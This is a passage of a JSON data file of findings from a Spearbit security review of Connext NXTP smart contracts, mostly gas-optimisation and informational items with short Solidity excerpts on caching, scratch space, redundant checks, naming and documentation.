        "body": "The usage of BridgeMessage library to calculate _tokenId, _action, and finally the formatted mes- sage involves lots of unnecessary memory writes, redundant checks, and overall complicates understanding the flow of the codebase. The BridgeMessage.formatMessage(_tokenId, _action) value passed to IOutbox(s.xAppConnectionManager.home()).dispatch is at the end with the current implementation supposed to be: 92 abi.encodePacked( _canonical.domain, _canonical.id, BridgeMessage.Types.Transfer, _amount, _transferId ); Also, it is redundant that the BridgeMessage.Types.Transfer has been passed to dispatch. it does not add any information to the message unless dispatch also accepts other types. This also adds extra gas overhead due to memory consumption both in the origin and destination domains.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "s.aavePool can be cached to save gas in _backLoan",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "s.aavePool can be cached to save gas by only reading once from the storage.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "<= or >= when comparing a constant can be converted to < or > to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In this context, we are doing the following comparison: X <= C // or X >= C Where X is a variable and C is a constant expression. But since the right-hand side of <= (or >=) is the constant expression C we can convert <= into < (or >= into >) to avoid extra opcode/bytecodes being produced by the compiler.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use memory's scratch space to calculateCanonicalHash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "calculateCanonicalHash uses abi.encode to prepare a memory chuck to calculate and return a hash value. Since only 2 words of memory are required to calculate the hash we can utilize the memory's scratch space [0x00, 0x40) for this regard. Using this approach would prevent from paying for memory expansion costs among other things.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "isLocalOrigin can be optimized by using a named return parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "isLocalOrigin after getting the code size of _token returns a comparison result as a bool: assembly { _codeSize := extcodesize(_token) } return _codeSize != 0; This last comparison can be avoided if we use a named return variable since the cast to bool type would automat- ically does the check for us. Currently, the check/comparison is performed twice under the hood. Note: also see issue \"Use contract.code.length\".",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The branching decision in AmplificationUtils._getAPrecise can be removed.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "_getAPrecise uses if/else block to compare a1 to a0. This comparison is unnecessary if we use a more simplified formula to return the interpolated value of a.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize increment in insert()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The increment tree.count in function insert() can be optimized. function insert(Tree storage tree, bytes32 node) internal returns (uint256) { uint256 size = tree.count + 1; ... tree.count = size; ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize calculation in loop of dequeueVerified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function dequeueVerified() can be optimized in the following way: (block.number - com- mitBlock >= delay) is the same as (block.number - delay >= commitBlock ) And block.number - delay is constant so it can be calculated outside of the loop. Also (x >= y) can be replaced by (!(x < y)) or (!(y > x)) to save some gas. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { ... for (last; last >= first; ) { uint256 commitBlock = queue.commitBlock[last]; if (block.number - commitBlock >= delay) { ... } } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache array length for loops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Fetching array length for each iteration generally consumes more gas compared to caching it in a variable.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization Diamond.sol#L35, Multicall.sol#L16, StableSwap.sol#L90, LibDi-"
        ]
    },
    {
        "title": "Use custom errors instead of encoding the error message",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "TypedMemView.sol replicates the functionality provided by custom error with arguments: (, uint256 g) = encodeHex(uint256(typeOf(memView))); (, uint256 e) = encodeHex(uint256(_expected)); string memory err = string( abi.encodePacked(\"Type assertion failed. Got 0x\", uint80(g), \". Expected 0x\", uint80(e)) ); revert(err); encodeHex() is only used to encode a variable for an error message.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Avoid OR with a zero variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Boolean OR operation with a zero variable is a no-op. Highlighted code above perform a boolean OR operation with a zero variable which can be avoided: newView := or(newView, shr(40, shl(40, memView))) ... newView := shl(96, or(newView, _type)) // insert type ... _encoded |= _nibbleHex(_byte >> 4); // top 4 bits",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use scratch space instead of free memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Memory slots 0x00 and 0x20 are scratch space. So any operation in assembly that needs at most 64 bytes of memory to write temporary data can use scratch space. Functions sha2(), hash160() and hash256() use free memory to write the intermediate hash values. The scratch space can be used here since these values fit in 32 bytes. It saves gas spent on reading the free memory pointer, and memory expansion.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant checks in _processMessageFromRoot() of PolygonSpokeConnector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _processMessageFromRoot() of PolygonSpokeConnector does two checks on sender, which are the same: PolygonSpokeConnector.sol#L78-L82,  validateSender(sender) checks sender == fxRootTunnel  _setMirrorConnector() and setFxRootTunnel() set fxRootTunnel = _mirrorConnector and mirrorCon- nector = _mirrorConnector  require(sender == mirrorConnector, ...) checks sender == mirrorConnector which is the same as sender == fxRootTunnel. Note: the require in _setMirrorConnector() makes sure the values can't be updated later on. So one of the checks in function _processMessageFromRoot() could be removed to save some gas and to make the code easier 104 to understand. contract PolygonSpokeConnector is SpokeConnector, FxBaseChildTunnel { function _processMessageFromRoot(..., ... require(sender == mirrorConnector, \"!sender\"); ... address sender, ... ) validateSender(sender) { } function _setMirrorConnector(address _mirrorConnector) internal override { require(fxRootTunnel == address(0x0), ...); setFxRootTunnel(_mirrorConnector); } } abstract contract FxBaseChildTunnel is IFxMessageProcessor { function setFxRootTunnel(address _fxRootTunnel) public virtual { ... fxRootTunnel = _fxRootTunnel; // == _mirrorConnector } modifier validateSender(address sender) { require(sender == fxRootTunnel, ...); _; } }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization PolygonSpokeConnector.sol#L61-L74,"
        ]
    },
    {
        "title": "Consider using bitmaps in _recordOutputAsSpent() of ArbitrumHubConnector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _recordOutputAsSpent() stores status via a mapping of booleans. However the equiv- alent function recordOutputAsSpent() of Arbritrum Nitro uses a mapping of bitmaps to store the status. Doing this saves gas. Note: this saving is possible because the index values are neatly ordered. function _recordOutputAsSpent(..., uint256 _index, ...) ... { ... require(!processed[_index], \"spent\"); ... processed[_index] = true; } Arbitrum version: function recordOutputAsSpent(..., uint256 index, ... ) ... { ... (uint256 spentIndex, uint256 bitOffset, bytes32 replay) = _calcSpentIndexOffset(index); if (_isSpent(bitOffset, replay)) revert AlreadySpent(index); spent[spentIndex] = (replay | bytes32(1 << bitOffset)); }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Move nonReentrant from process() to proveAndProcess()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function process() has a nonReentrant modifier. The function process() is also internal and is only called from proveAndProcess(), so it also possible to move the nonReentrant modifier to function proveAndProcess(). This would save repeatedly setting and unsetting the status of nonReentrant, which saves gas. function proveAndProcess(...) ... { ... for (uint32 i = 0; i < _proofs.length; ) { process(_proofs[i].message); unchecked { ++i; } } } function process(bytes memory _message) internal nonReentrant returns (bool _success) { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "OpenZeppelin libraries IERC20Permit and EIP712 are final",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The OpenZeppelin libraries have changed IERC20Permit and EIP712 to a final version, so the final versions can be used. OZERC20.sol import \"@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol\"; import {EIP712} from \"@openzeppelin/contracts/utils/cryptography/draft-EIP712.sol\"; draft-IERC20Permit.sol // EIP-2612 is Final as of 2022-11-01. This file is deprecated. import \"./IERC20Permit.sol\"; draft-EIP712.sol // EIP-712 is Final as of 2022-08-11. This file is deprecated. import \"./EIP712.sol\";",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use Foundry's multi-chain tests",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Foundry supports multi-chain testing that can be useful to catch bugs earlier in the development process. Local multi-chain environment can be used to test many scenarios not possible on test chains or in production. Since Connectors are a critical part of NXTP protocol.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Risk of chain split",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Domains are considered immutable (unless implementation contracts are redeployed). In case of chain splits, both the forks will continue having the same domain and the recipients won't be able to differentiate which source chain of the message.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use zkSync's custom compiler for compiling and (integration) testing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The protocol needs to be deployed on zkSync. For deployment, the contracts would need to be compiled with zkSync's custom compiler. The bytecode generated by the custom Solidity compiler is quite dif- ferent compared to the original compiler. One thing to note is that cryptographic functions in Solidity are being replaced/inlined to static calls to zkSync's set of system precompile contracts.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Shared logic in SwapUtilsExternal and SwapUtils can be consolidated or their changes would need to be synched.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The SwapUtilsExternal library and SwapUtils share quite a lot of functions (events/...) logics . The main differences are:  SwapUtilsExternal.swap does not have the following check but SwapUtils.swap does: // File: connext/libraries/SwapUtils.sol#L715 require(dx == tokenFrom.balanceOf(address(this)) - beforeBalance, \"no fee token support\"); This is actually one of the big/important diffs between current SwapUtils and SwapUtilsExternal. Other differ- ences are:  Some functions are internal in SwapUtils, but they are external/public in SwapUtilsExternal.  AmplificationUtils is basically copied in SwapUtilsExternal and its functions have been made external.  SwapUtilsExternal does not implement exists.  SwapUtilsExternal does not implement swapInternal.  The SwapUtils's Swap struct has an extra field key as do the events in this file.  Some inconsistent formatting. 109",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document why < 3s was chosen as the timestamp deviation cap for price reporting in setDirect- Price",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "setDirectPrice uses the following require statement to filter direct price reports by the owner. require(_timestamp - block.timestamp < 3, \"in future\"); Only prices with _timestamp within 3s of the current block timestamp are allowed to be registered.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what IConnectorManager entities would be passed to BridgeFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Document what type of IConnectorManager implementations would the owner or an admin set for the s.xAppConnectionManager. The only examples in the codebase are SpokeConnectors.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Second nonReentrant modifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A previous version of xcall() had a nonReentrant modifier. This modifier was removed to enable execute() to call xcall() to return data to the originator chain. To keep a large part of the original protec- tion it is also possible to use a separate nonReentrant modifier (which uses a different storage variable) for xcall()/xcallIntoLocal(). This way both execute and xcall()/xcallIntoLocal() can be called once at the most. function xcall(...) ... { } function xcallIntoLocal(...) ... { } function execute(ExecuteArgs calldata _args) external nonReentrant whenNotPaused returns (bytes32) { }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Return 0 in swapToLocalAssetIfNeeded()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The return in function swapToLocalAssetIfNeeded() could also return 0. Which is somewhat more readable and could save some gas. Note: after studying the compiler output it might not actually save gas. 111 function swapToLocalAssetIfNeeded(...) ... { if (_amount == 0) { return _amount; } ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use contract.code.length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Retrieving the size of a contract is done in assembly, with extcodesize(). This can also be done in solidity which is more readable. Note: assembly might be a bit more gas efficient, especially if optimized even further: see issue \"isLocalOrigin can be optimized by using a named return parameter\". LibDiamond.sol function enforceHasContractCode(address _contract, string memory _errorMessage) internal view { uint256 contractSize; assembly { contractSize := extcodesize(_contract) } require(contractSize != 0, _errorMessage); } AssetLogic.sol function isLocalOrigin(address _token, AppStorage storage s) internal view returns (bool) { ... uint256 _codeSize; // solhint-disable-next-line no-inline-assembly assembly { _codeSize := extcodesize(_token) } return _codeSize != 0; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "cap and liquidity tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function addLiquidity() also adds tokens to the Connext Diamond contract. If these tokens are the same as canonical tokens it wouldn't play nicely with the cap on these tokens. For others tokens it might also be relevant to have a cap. function addLiquidity(...) ... { ... token.safeTransferFrom(msg.sender, address(this), amounts[i]); ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplify _swapAssetOut()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _swapAssetOut() has relative complex logic where it first checks the tokens that will be received and then preforms a swap. It prevents reverting by setting the success flag. However function repayAave- Portal() still reverts if this flag is set. The comments show this was meant for reconcile(), however repaying the Aave dept in the reconcile phase no longer exists. So _swapAssetOut() could just revert if insufficiently tokens are provided. This way it would also be more similar to _swapAsset(). This will make the code more readable and safe some gas. AssetLogic.sol 113 function _swapAssetOut(...) ... returns ( bool success, ...) { ... if (ipool.exists()) { ... // Calculate slippage before performing swap. // NOTE: This is less efficient then relying on the `swapInternalOut` revert, but makes it ,! easier // to handle slippage failures (this can be called during reconcile, so must not fail). ... if (_maxIn >= ipool.calculateSwapInv(tokenIndexIn, tokenIndexOut, _amountOut)) { success = true; amountIn = ipool.swapInternalOut(tokenIndexIn, tokenIndexOut, _amountOut, _maxIn); } } else { ... uint256 _amountIn = pool.calculateSwapOutFromAddress(_assetIn, _assetOut, _amountOut); if (_amountIn <= _maxIn) { success = true; ... amountIn = pool.swapExactOut(_amountOut, _assetIn, _assetOut, _maxIn, block.timestamp + ,! 3600); } } } function swapFromLocalAssetIfNeededForExactOut(...) { ... return _swapAssetOut(_key, _asset, adopted, _amount, _maxIn); } PortalFacet.sol function repayAavePortal(...) { ... (bool success, ..., ...) = AssetLogic.swapFromLocalAssetIfNeededForExactOut(...); if (!success) revert PortalFacet__repayAavePortal_swapFailed(); ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Return default false in the function end",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "verify function is missing a default return value. A return value of false can be added on the function end",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Change occurances of whitelist to allowlist",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In the codebase, whitelist is used to represent entities or objects that are allowed to be used or perform certain tasks. This word is not so accurate/suggestive and also can be offensive.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment on _mirrorConnector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The comment on _mirrorConnector is incorrect as this does not denote address of the spoke connector",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "addStableSwapPool can have a more suggestive name and also better documentation for the _- stableSwapPool input parameter is recommended",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "1. The name suggests we are adding a new pool, although we are replacing/updating the current one. 2. _stableSwapPool needs to implement IStableSwap and it is supposed to be an external stable swap pool. It would be best to indicate that and possibly change the parameter input type to IStableSwap _stableSwap- Pool. 3. _stableSwapPool provided by the owner or an admin can have more than just 2 tokens as the @notice comment suggests. For example, the pool could have oUSDC, nextUSDC, oDAI, nextDAI, ... . Also there are no guarantees that the pooled tokens are pegged to each other. There is also a potential of having these pools have malicious or worthless tokens. What external pools does Connext team uses or is planning to use? This comment also applies to setupAsset and setupAssetWithDeployedRepresentation.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "_local has a misleading name in _addLiquidityForRouter and _removeLiquidityForRouter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The name for _local parameter is misleading, since it has been used in _addLiquidityForRouter (TokenId memory canonical, bytes32 key) = _getApprovedCanonicalId(_local); and in _removeLiquidityForRouter TokenId memory canonical = _getCanonicalTokenId(_local); and we have the following call flow path: AssetLogic.getCanonicalTokenId uses the adoptedToCanonical mapping first then check if the input parameter is a canonical token for the current domain, then uses representationToCanonical mapping. So here _local could be an adopted token.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document _calculateSwap's and _calculateSwapInv's calculations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In _calculateSwap, the -1 in dy = xp[tokenIndexTo] - y - 1 is actually important. This is be- cause given no change in the asset balance of all tokens that already satisfy the stable swap invariant (dx = 0), getY (due to rounding errors) might return:  y = xp[tokenIndexTo] which would in turn make dy = -1 that would revert the call. This case would need to be investigated.  y = xp[tokenIndexTo] - 1 which would in turn make dy = 0 and so the call would return (0, 0).  y = xp[tokenIndexTo] + 1 which would in turn make dy = -2 that would revert the call. This case would need to be investigated. 117 And similiarly in _calculateSwapInv, doing the same analysis for + 1 in dx = x - xp[tokenIndexFrom] + 1, if getYD returns:  xp[tokenIndexFrom] +1, then dx = 2;  xp[tokenIndexFrom], then dx = 1;  xp[tokenIndexFrom] - 1, then dx = 0; Note, that the behavior is different and the call would never revert.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Providing the from amount the same as the pool's from token balance, one might get a different return value compared to the current pool's to balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Note, due to some imbalance in the asset pool, given x = xp[tokenIndexFrom] (aka, no change in asset balance of tokenIndexFrom token in the asset pool), we might see a decrease or increase in the asset balance of tokenIndexTo to bring back the pool to satisfying the stable swap invariant. One source that can introduce an imbalance is when the scaled amplification coefficient is ramping.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what type 0 means for TypedMemView",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "In the following line, 0 is passed as the new type for a TypedMemView bytes29 _message.slice(PREFIX_LENGTH, _message.len() - PREFIX_LENGTH, 0) But there is no documentation as to what type 0 signifies.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mixed use of require statements and custom errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The codebase includes a mix of require statements and custom errors.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "WatcherManager can make watchers public instead of having a getter function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "WatcherManager has a private mapping watchers and a getter function isWatcher() to query that mapping. Since WatcherManager is not inherited by any other contract, it is safe to make it public to avoid the need of an explicit getter function.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment about relation between zero amount and asset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "At BridgeFacet.sol#L514, if _amount == 0, _asset is allowed to have any user-specified value. _- xcall() reverts when zero address is specified for _asset on a non-zero _amount: if (_asset == address(0) && _amount != 0) { revert BridgeFacet__xcall_nativeAssetNotSupported(); } However, according to this comment if amount is 0, _asset also has to be the zero address which is not true (since it uses IFF): _params.normalizedIn = _asset == address(0) ? 0 // we know from assertions above this is the case IFF amount == 0 : AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount);",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "New Connector needs to be deployed if AMB changes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The AMB address is configured to be immutable. If any of the chain's AMB changes, the Connector needs to be deployed. /** * @notice Address of the AMB on this domain. */ address public immutable AMB;",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions should be renamed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The following functions should be renamed to be aligned with the naming convention of the fxPortal contracts.  OptimismHubConnector.processMessageFromRoot to OptimismHubConnector.processMessageFromChild  ArbitrumHubConnector.processMessageFromRoot to ArbitrumHubConnector.processMessageFromChild  ZkSyncHubConnector.processMessageFromRoot to ZkSyncHubConnector.processMessageFromChild",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Twice function aggregate()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Both the contracts Multicall and RootManager have a function called aggregate(). This could be confusing. Contract Multicall doesn't seem to be used. Multicall.sol function aggregate(Call[] memory calls) public view returns (uint256 blockNumber, bytes[] memory returnData) { ... ,! } RootManager.sol 120 function aggregate(uint32 _domain, bytes32 _inbound) external whenNotPaused onlyConnector(_domain) { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Careful when using _removeAssetId()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _removeAssetId() removes an assets. Although it is called via authorized functions, mistakes could be made. It there are any representation assets left, they are worthless as they can't be bridged back anymore (unless reinstated via setupAssetWithDeployedRepresentation()). The representation assets might also be present and allowed in the StableSwap. If so, the owners of the worthless tokens could quickly swap them for real tokens. The canonical tokens will also be locked. function _removeAssetId(...) ... { ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused import IAavePool in InboxFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Contract InboxFacet imports IAavePool, however it doesn't use it. import {IAavePool} from \"../interfaces/IAavePool.sol\";",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use IERC20Metadata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "interface. pelin/contracts/token/ERC20/extensions/IERC20Metadata.sol, which seems more logical. BridgeFacet.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function _xcall(...) ... { ... ... AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount); ... } AssetLogic.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function swapToLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(ERC20(_asset).decimals(), ERC20(_local).decimals(), _amount, _slippage) ... ... ,! } function swapFromLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(uint8(18), ERC20(adopted).decimals(), _normalizedIn, _slippage) ... ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Generic name of proposedTimestamp()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function proposedTimestamp() has a very generic name. As there are other Timestamp func- tions this might be confusing. function proposedTimestamp() public view returns (uint256) { return s._proposedOwnershipTimestamp; } function routerWhitelistTimestamp() public view returns (uint256) { return s._routerWhitelistTimestamp; } function assetWhitelistTimestamp() public view returns (uint256) { return s._assetWhitelistTimestamp; }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Two different nonces",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Both LibConnextStorage and SpokeConnector define a nonce. As the names are very similar this could be confusing. LibConnextStorage.sol struct AppStorage { ... * @notice Nonce for the contract, used to keep unique transfer ids. * @dev Assigned at first interaction (xcall on origin domain). uint256 nonce; ... } SpokeConnector.sol * @notice domain => next available nonce for the domain. mapping(uint32 => uint32) public nonces;",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Tips to optimize rootWithCtx",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "To help with the optimization mentioned in the comment of rootWithCtx(), here is a way to count the trailing 0s: graphics.stanford.edu/~seander/bithacks.html#ZerosOnRightModLookup. function rootWithCtx(Tree storage tree, bytes32[TREE_DEPTH] memory _zeroes) internal view returns (bytes32 _current) { ... // TODO: Optimization: skip the first N loops where the ith bits are all 0 - start at that // depth with zero hashes. ... ,! }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use delete",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The functions _setOwner() and removeRouter() clear values by setting them to 0. Other parts of the code use delete. So using delete here too would be more consistent. ProposedOwnable.sol function _setOwner(address newOwner) internal { ... _proposedOwnershipTimestamp = 0; _proposed = address(0); ... } RoutersFacet.sol function removeRouter(address router) external onlyOwnerOrRouter { ... s.routerPermissionInfo.routerOwners[router] = address(0); ... s.routerPermissionInfo.routerRecipients[router] = address(0); ... }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: Informational"
        ]
    },
    {
        "title": "replace usages of abi.encodeWithSignature and abi.encodeWithSelector with abi.encodeCall to ensure typo and type safety",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
